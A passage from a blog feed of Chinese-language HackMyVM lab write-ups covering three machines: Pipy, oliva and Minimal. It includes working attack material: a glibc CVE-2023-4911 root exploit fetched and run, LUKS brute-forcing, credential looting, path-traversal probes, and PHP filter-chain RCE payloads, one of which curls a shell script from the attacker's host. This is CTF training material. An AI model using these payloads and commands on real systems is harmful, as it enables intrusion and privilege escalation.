/snap/core/16202/usr/bin/chfn
/snap/core/16202/usr/bin/chsh
/snap/core/16202/usr/bin/gpasswd
/snap/core/16202/usr/bin/newgrp
/snap/core/16202/usr/bin/passwd
/snap/core/16202/usr/bin/sudo
/snap/core/16202/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/16202/usr/lib/openssh/ssh-keysign
/snap/core/16202/usr/lib/snapd/snap-confine
/snap/core/16202/usr/sbin/pppd
angela@pipy:/mnt$ /sbin/getcap -r / 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
angela@pipy:/mnt$ ss -tuln | grep tcp
tcp   LISTEN 0      80                  127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      4096            127.0.0.53%lo:53        0.0.0.0:*        
tcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      1024                127.0.0.1:4226      0.0.0.0:*        
tcp   LISTEN 0      511                         *:80              *:*        
tcp   LISTEN 0      128                      [::]:22           [::]:*        
angela@pipy:/mnt$ nc
nc          nc.openbsd  
angela@pipy:/mnt$ nc 127.0.0.1 4226
a
hello
root
angela@pipy:/mnt$ ls
angela@pipy:/mnt$ nc 127.0.0.1 4226
root
admin
```

什么都没找到,还没定时任务，不会是**内核提权**吧，尝试一下可不可以使用自动化工具提权

```bash
angela@pipy:/mnt$ cd /tmp/
angela@pipy:/tmp$ wget 192.168.205.141/traitor-386
--2025-01-18 02:52:07--  http://192.168.205.141/traitor-386
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8475976 (8.1M) [application/octet-stream]
Saving to: ‘traitor-386’

traitor-386                                                  0%[                                                                       traitor-386                                                100%[========================================================================================================================================&gt;]   8.08M  --.-KB/s    in 0.03s   

2025-01-18 02:52:07 (282 MB/s) - ‘traitor-386’ saved [8475976/8475976]

angela@pipy:/tmp$ chmod +x traitor-386 
angela@pipy:/tmp$ ./traitor-386 -a

                                                                                                                                     
▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                                                                                            
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                                    
https://github.com/liamg/traitor                                                                                                     
                                                                                                                                     
[+] Assessing machine state...                                                                                                       
[+] Checking for opportunities...
[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
[+][kernel:CVE-2022-0847] Opportunity found, trying to exploit it...
[+][kernel:CVE-2022-0847] Attempting to set root password...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][kernel:CVE-2022-0847] Starting shell...
[+][kernel:CVE-2022-0847] Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored.
[+][kernel:CVE-2022-0847] Setting up tty...
[+][kernel:CVE-2022-0847] Attempting authentication as root...
[+][kernel:CVE-2022-0847] Restoring contents of /etc/passwd...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][error] Exploit failed: invalid password
[+] Continuing to look for opportunities
[+] Nothing found to exploit.
```

不可以，那还是我们自己找吧

```bash
angela@pipy:/tmp$ uname -a
Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
angela@pipy:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

找一下，发现**[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**可以，但是要用特定的脚本，有些脚本不行

```bash
#kali
┌──(kali㉿kali)-[~/test/tmp]
└─$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
┌──(kali㉿kali)-[~/test/tmp]
└─$ python3 -m http.server 80                                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
#靶机
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:17--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... failed: Connection refused.
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:25--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3044 (3.0K) [application/octet-stream]
Saving to: ‘main.zip’

main.zip                                                   0%[                                                                       main.zip.1                                                 100%[========================================================================================================================================&gt;]   2.97K  --.-KB/s    in 0s    

2025-01-18 03:06:25 (21.8 MB/s) - ‘main.zip’ saved [3044/3044]

angela@pipy:/tmp$ unzip main.zip
Archive:  main.zip
acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
   creating: CVE-2023-4911-main/
  inflating: CVE-2023-4911-main/Makefile  
  inflating: CVE-2023-4911-main/README.md  
  inflating: CVE-2023-4911-main/exp.c  
  inflating: CVE-2023-4911-main/gen_libc.py  
angela@pipy:/tmp$ cd CVE-2023-4911-main/
angela@pipy:/tmp/CVE-2023-4911-main$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
try 100
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Pipy.html</guid><pubDate>Fri, 27 Jun 2025 09:33:28 +0000</pubDate></item><item><title>hmv_oliva</title><link>https://7r1UMPHK.github.io/post/hmv_oliva.html</link><description># hmv_oliva

# 0. 简介

**靶机**：[hackmyvm - oliva](https://hackmyvm.eu/machines/machine.php?vm=oliva)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1. 扫描

使用 `nmap` 扫描：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 08:43 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:83:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

扫描结果显示目标开启了 **SSH** (22/tcp) 和 **HTTP** (80/tcp) 服务。

# 2. 踩点

访问主页是 Nginx 欢迎页面，没有发现有价值的信息。进行目录爆破。

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
```

结果显示：

```
200      GET    70541l   415824w 34717484c http://192.168.205.138/oliva
200      GET        5l       10w       69c http://192.168.205.138/index.php
200      GET       23l       75w      615c http://192.168.205.138/index.html
```

`http://192.168.205.138/oliva` 是个二进制文件，进一步分析它。

```bash
┌──(kali㉿kali)-[~/test]
└─$ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {'keyslots':{'0':{'type':'luks2','key_size':64,'af':{'type':'luks1','stripes':4000,'hash':'sha256'},'area':{'type':'raw','offse
```

`file` 命令输出显示 `oliva` 是一个 **LUKS (Linux Unified Key Setup) 加密文件**，我们尝试提取它的哈希进行爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ luks2john oliva &gt; hash
oliva : Only LUKS1 is supported. Used version: 2
```

`luks2john` 工具当前只支持 LUKS 版本 1，而我们的文件是 LUKS 版本 2 格式，所以我们得另寻出路。找到了一篇[文章](https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases)，我们尝试一下

![Image](https://github.com/user-attachments/assets/922131df-15e3-4d27-9715-1823b19a4fbb)

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo apt install bruteforce-luks -y
┌──(kali㉿kali)-[~/test]
└─$ bruteforce-luks -t 4 -f /usr/share/wordlists/q5000.txt oliva
Password found: bebita
```

使用暴力破解成功获得口令 `bebita`，接下来打开加密文件。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo cryptsetup luksOpen oliva oliva
请输入 oliva 的口令：bebita
```

查看文件系统：

```bash
┌──(kali㉿kali)-[~/test]
└─$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINTS
loop0     7:0    0 19.1M  0 loop  
└─oliva 254:0    0  3.1M  0 crypt
```

挂载并查看文件：

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo mount /dev/mapper/oliva /mnt
┌──(kali㉿kali)-[/mnt]
└─$ ls -al
总计 18
drwxr-xr-x  3 root root  1024 2023年 7月 4日 .
drwxr-xr-x 18 root root  4096 12月 6日 19:03 ..
drwx------  2 root root 12288 2023年 7月 4日 lost+found
-rw-r--r--  1 root root    16 2023年 7月 4日 mypass.txt
```

查看 `mypass.txt` 内容：

```bash
┌──(kali㉿kali)-[/mnt]
└─$ cat mypass.txt
Yesthatsmypass!
```

# 3. 登录 SSH

使用文件中找到的密码 `Yesthatsmypass!` 登录 SSH。

```bash
┌──(kali㉿kali)-[/mnt]
└─$ ssh oliva@192.168.205.138
oliva@192.168.205.138's password: Yesthatsmypass!
oliva@oliva:~$ id
uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

# 4. 提权

查看 `sudo` 配置：

```bash
oliva@oliva:~$ sudo -l
-bash: sudo: orden no encontrada
```

`sudo` 未安装，检查系统权限：

```bash
oliva@oliva:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

使用 `getcap` 查看权限：

```bash
┌──(kali㉿kali)-[~/test]
└─$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

查看 `/var/www/html/` 目录，使用`nmap`看有没有什么隐藏信息

```bash
┌──(kali㉿kali)-[~/test]
└─$ cd /var/www/html/
└─$ ls -la
total 19548
drwxr-xr-x 2 root     root         4096 jul  4  2023 .
drwxr-xr-x 3 root     root         4096 jul  4  2023 ..
-rw-rw---- 1 www-data www-data      615 jul  4  2023 index.html
-rw-rw---- 1 www-data www-data      163 jul  4  2023 index.php
-rw-rw---- 1 www-data www-data 20000000 jul  4  2023 oliva
oliva@oliva:/var/www/html$ nmap -iL index.php 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-22 03:34 CET
Failed to resolve 'Hi'.
Failed to resolve 'oliva,'.
Failed to resolve 'Here'.
Failed to resolve 'the'.
Failed to resolve 'pass'.
Failed to resolve 'to'.
Failed to resolve 'obtain'.
Failed to resolve 'root:'.
Failed to resolve '&lt;?php'.
Failed to resolve '$dbname'.
Failed to resolve '='.
Failed to resolve ''easy';'.
Failed to resolve '$dbuser'.
Failed to resolve '='.
Failed to resolve ''root';'.
Failed to resolve '$dbpass'.
Failed to resolve '='.
Failed to resolve ''Savingmypass';'.
Failed to resolve '$dbhost'.
Failed to resolve '='.
Failed to resolve ''localhost';'.
Failed to resolve '?&gt;'.
Failed to resolve '&lt;a'.
Unable to split netmask from target expression: 'href='oliva'&gt;CLICK!&lt;/a&gt;'
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 65.35 seconds
```

通过查看 `index.php` 中的内容，发现数据库登录信息，并登录 MariaDB 数据库：

```bash
┌──(kali㉿kali)-[~/test]
└─$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5
Server version: 10.11.3-MariaDB-1 Debian 12
```

查看数据库 `easy`：

```bash
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

MariaDB [(none)]&gt; use easy;
MariaDB [easy]&gt; show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
```

查看 `logging` 表：

```bash
MariaDB [easy]&gt; select * from logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
```

使用密码 `OhItwasEasy!` 登录 root 用户：

```bash
┌──(kali㉿kali)-[~/test]
└─$ su -
Contraseña: OhItwasEasy!
root@oliva:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

成功提权，获取 root 权限。

# 5.收尾

```bash
# 卸载加密设备
sudo umount /mnt

# 关闭 LUKS 加密设备
sudo cryptsetup luksClose oliva

# 查看设备是否已经关闭
lsblk

# 检查是否仍然挂载
mount | grep /dev/mapper
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_oliva.html</guid><pubDate>Fri, 27 Jun 2025 09:33:26 +0000</pubDate></item><item><title>hmv_Minimal</title><link>https://7r1UMPHK.github.io/post/hmv_Minimal.html</link><description># hmv_Minimal

# 0.简介

**靶机**：[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
**难度**：黄色
**目标 IP**：192.168.205.135
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
Nmap scan report for 192.168.205.135
Host is up (0.00054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

先看**80端口**，**22端口**候补

# 2.踩点

![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)

（页面挺简洁）发现一个**登录网页(login.php)**  ，测试了`弱密码、sql注入、万能密码`均无果，没有现成的，我们自己注册一个

![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)

注册完之后，可以把一些商品加入购物车

![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)

当你准备买单的时候，点击`Buy items`会发现，网址出现了变化。新网址可能会存在文件包含漏洞，我们帮他测试一下❐‿❑

```bash
http://192.168.205.135/shop_cart.php?action=/etc/passwd
http://192.168.205.135/shop_cart.php?action=../../../../etc/passwd
http://192.168.205.135/shop_cart.php?action=....//....//....//....//etc/passwd
http://192.168.205.135/shop_cart.php?action=php://filter/convert.base64-encode/resource=index
```

![image](https://github.com/user-attachments/assets/d2f1f884-fd50-4efd-b512-b8667466e41e)

测试了四条，只有第四条有反应，我们继续尝试可不可以通过**PHP 过滤器链** 来执行命令

![image](https://github.com/user-attachments/assets/845afd2d-5281-4308-8119-58e7de747b75)

```bash
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id
```

（☆ω☆*）可以执行，使用的是这个工具 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)。我们弹个shell回来

```bash
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=curl 192.168.205.141/shell.sh -o /tmp/a.sh
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=chmod +x /tmp/a.sh
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.C